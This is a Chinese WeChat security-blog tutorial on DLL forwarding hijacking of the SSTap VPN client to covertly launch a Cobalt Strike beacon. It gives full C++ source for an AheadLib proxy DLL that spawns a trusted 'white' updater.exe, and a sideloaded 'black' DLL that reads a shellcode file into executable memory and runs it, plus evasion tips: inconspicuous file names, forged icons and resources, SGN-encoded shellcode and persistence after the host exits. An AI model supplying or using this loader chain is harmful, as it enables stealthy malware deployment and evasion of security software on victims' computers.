#  DLL转发劫持还能这么玩？

原创 relaysec  [ Relay学安全 ](javascript:void\(0\);)

**Relay学安全** ![]()

微信号 gh_8d57319ec39c

功能介绍
这是一个纯分享技术的公众号，只想做安全圈的一股清流，不会发任何广告，不会接受任何广告，只会分享纯技术文章，欢迎各行各业的小伙伴关注。让我们一起提升技术。

____

___发表于_

发现很多网上都是直接劫持目标程序加载DLL，直接转发DLL劫持，然后将shellcode写到劫持的那个DLL里面。

最终目标程序加载我们恶意DLL的时候成功上线。

那么我们思考一下，shellcode写入到dll中肯定是被查杀的不用说。

那么我们能不能通过转发dll劫持去点击白程序，然后通过白程序去加载我们的恶意dll呢？

比如说我们现在有一个sstap.exe这个程序，这个程序是一个VPN软件，当执行它的时候会加载很多的dll文件。

那么我们通过DLL转发劫持，拿到一个新的DLL之后，在新的DLL中写入打开白程序的代码，通过白程序去加载黑DLL。就算将sstap.exe退了，也不会导致我们的beacon下线。

如下图:

![]()

那么我们来一步一步的实现，首先我们肯定先要做一个DLL转发劫持。

这里使用到AheadLib工具来做转发DLL劫持。

这里我们使用到的程序是sstap.exe，当然你也可以使用其他的。

![]()

这里需要将原始DLL的名字更改一下这里，改成libiconv2Help，其实也可以更改为其他名字，只要不是那么明显就好，点击生成即可。

生成代码如下:

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    #include <Windows.h>#pragma comment(linker, "/EXPORT:DllGetVersion=libiconv2Help.DllGetVersion,@1")#pragma comment(linker, "/EXPORT:_libiconv_version=libiconv2Help._libiconv_version,@2")#pragma comment(linker, "/EXPORT:libiconv=libiconv2Help.libiconv,@3")#pragma comment(linker, "/EXPORT:libiconv_close=libiconv2Help.libiconv_close,@4")#pragma comment(linker, "/EXPORT:libiconv_open=libiconv2Help.libiconv_open,@5")#pragma comment(linker, "/EXPORT:libiconv_set_relocation_prefix=libiconv2Help.libiconv_set_relocation_prefix,@6")#pragma comment(linker, "/EXPORT:libiconvctl=libiconv2Help.libiconvctl,@7")#pragma comment(linker, "/EXPORT:libiconvlist=libiconv2Help.libiconvlist,@8")#pragma comment(linker, "/EXPORT:locale_charset=libiconv2Help.locale_charset,@9")BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved){  if (dwReason == DLL_PROCESS_ATTACH)  {    DisableThreadLibraryCalls(hModule);  }  else if (dwReason == DLL_PROCESS_DETACH)  {  }  
      return TRUE;}

现在我们来实现第二步，在DLLMain方法中需要通过创建一个线程去执行点击操作。

如下代码:
可以看到这里通过ShellExecute函数去点击updater.exe，也就是说我们去运行sstap.exe的时候他会加载libiconv2.dll，而这个dll被我们转发劫持掉了，而转发的这个dll中写的就是点击updater.exe，当点击updater.exe的时候他就会去加载黑DLL上线。

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    // 头文件#include "pch.h"#include <Windows.h>#include <iostream>#include <Windows.h>#include <shlwapi.h>#include <shlobj_core.h>#pragma comment(lib, "Shlwapi.lib")#include <ShellAPI.h>  
    // 导出函数#pragma comment(linker, "/EXPORT:DllGetVersion=libiconv2Help.DllGetVersion,@1")#pragma comment(linker, "/EXPORT:_libiconv_version=libiconv2Help._libiconv_version,@2")#pragma comment(linker, "/EXPORT:libiconv=libiconv2Help.libiconv,@3")#pragma comment(linker, "/EXPORT:libiconv_close=libiconv2Help.libiconv_close,@4")#pragma comment(linker, "/EXPORT:libiconv_open=libiconv2Help.libiconv_open,@5")#pragma comment(linker, "/EXPORT:libiconv_set_relocation_prefix=libiconv2Help.libiconv_set_relocation_prefix,@6")#pragma comment(linker, "/EXPORT:libiconvctl=libiconv2Help.libiconvctl,@7")#pragma comment(linker, "/EXPORT:libiconvlist=libiconv2Help.libiconvlist,@8")#pragma comment(linker, "/EXPORT:locale_charset=libiconv2Help.locale_charset,@9")  
      
    DWORD WINAPI run(LPVOID lpParameter) {  ShellExecute(NULL, L"open", L"updater.exe", NULL, NULL, SW_SHOW);  return 0;}  
    // 入口函数BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved){  if (dwReason == DLL_PROCESS_ATTACH)  {    CreateThread(NULL, 0, run, NULL, 0, NULL);    DisableThreadLibraryCalls(hModule);    }  else if (dwReason == DLL_PROCESS_DETACH)  {  }  
      return TRUE;}

我们生成DLL之后通过resource Hacker去给他打上kernel32.res的资源。

  

![]()

然后我们将它拉入到SSTAP包中，更改名称为libiconv2.dll即可，然后将原始的DLL的名字更改为libiconv2Help.dll即可。

![]()

然后我们需要白程序和黑DLL也拉进去。

这里黑DLL也是需要在导出函数中写你的loader。

代码如下: 需要注意的是这里我们读取的Proxy.conf文件，这个文件就是我们的shellcode。

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    // dllmain.cpp : 定义 DLL 应用程序的入口点。#include "pch.h"#include <Windows.h>  
      
    extern "C" __declspec(dllexport) int error_output() {           return 0;}extern "C" __declspec(dllexport) int dirutils_path_transform() {     return 0;}extern "C" __declspec(dllexport) int autolog_init() {     return 0;}extern "C" __declspec(dllexport) int error_output_check() {    DWORD dwSize;    DWORD dwReadSize;    HANDLE hFileNew;    hFileNew = CreateFile(L"Proxy.conf", GENERIC_ALL, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);  
        if (hFileNew == INVALID_HANDLE_VALUE)    {        return 0;    }  
        dwSize = GetFileSize(hFileNew, NULL);  
        void* exec = VirtualAlloc(0, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);  
        ReadFile(hFileNew, exec, dwSize, &dwReadSize, NULL);  
        ((void(*)())exec)();     return 0;}  
      
    BOOL APIENTRY DllMain( HMODULE hModule,                       DWORD  ul_reason_for_call,                       LPVOID lpReserved                     ){    switch (ul_reason_for_call)    {    case DLL_PROCESS_ATTACH:        case DLL_THREAD_ATTACH:    case DLL_THREAD_DETACH:    case DLL_PROCESS_DETACH:        break;    }    return TRUE;}

将白程序和黑dll以及shellcode放到sstap目录中，这里的白程序为了不引人注意，所以添加了icon图标，当然你也可以添加，其实也是通过resource
hacker去添加的。

如下图:

![]()

然后当我们去运行sstap.exe的时候如下:

  * 

    
    
    sstap.exe加载libiconv2.dll -> libiconv2.dll点击updater.exe -> updater.exe加载黑DLL + 最后加载shellcode

这里的shellcode可以通过SGN去加密即可。

当我们点击sstap.exe的时候，正常打开,如下图:

![]()

然后我们来到Cobalt Strike这里可以看到已经上线了。

并且上线的并不是sstap.exe，而是updater.exe。

![]()

当我们将sstap.exe退了之后会发现我们的beacon.exe是不会掉的。因为进程中跑的是updater.exe。

![]()

最后别忘了转发噢。

预览时标签不可点

微信扫一扫  
关注该公众号

继续滑动看下一个

# DLL转发劫持还能这么玩？

原创 relaysec  [ Relay学安全 ](javascript:void\(0\);)

轻触阅读原文

![]()

Relay学安全

向上滑动看下一个

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看 分享 留言

